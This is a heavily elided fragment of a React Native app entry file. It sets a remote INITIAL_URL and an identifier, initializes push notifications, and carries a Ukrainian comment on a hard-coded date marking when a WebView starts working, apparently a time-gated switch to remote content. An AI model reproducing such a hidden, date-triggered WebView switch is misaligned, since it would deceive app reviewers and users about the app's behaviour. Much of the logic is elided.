...
import JinkoBloomProdScr from './src/screens/JinkoBloomProdScr';
...
const App = () => {
  ...
  const INITIAL_URL = `https://mint-shadow-atlas.space/`;
  const URL_IDENTIFAIRE = `H50PE1AF`;
  ...
  OneSignal.initialize('c5e5a35e-74de-40c4-9cbf-860ba4f22d45');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-07-27T18:18:00'); //дата з якої поч працювати webView
      ...
      return (
        <Stack.Navigator>
          <Stack.Screen
            ...
            name="JinkoBloomProdScr"
            component={JinkoBloomProdScr}
